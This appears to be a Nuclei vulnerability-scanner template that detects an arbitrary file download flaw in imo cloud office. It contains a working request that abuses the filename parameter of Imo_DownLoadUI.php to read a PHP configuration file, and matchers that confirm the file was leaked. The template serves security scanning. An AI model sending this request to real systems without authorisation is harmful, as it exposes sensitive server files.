http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <?php
    - $bindInfo = array
  - condition: and
    part: header
    type: word
    words:
    - application/octet-stream
    - filename=/home/www
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/OpenPlatform/config/kdBind.php
    HTTP/1.1

    Host: {{Hostname}}

    '
id: imo-file-download
info:
  author: ritikchaddha
  description: 'The imo cloud office can read system sensitive files because the filename
    parameter of the /file/Placard/upload/Imo_DownLoadUI.php page is not strictly
    filtered.

    '
  metadata:
    max-request: 2
  name: IMO - Arbitrary File Download
  reference:
  - https://forum.butian.net/article/214
  severity: high
  tags: imo,file-download
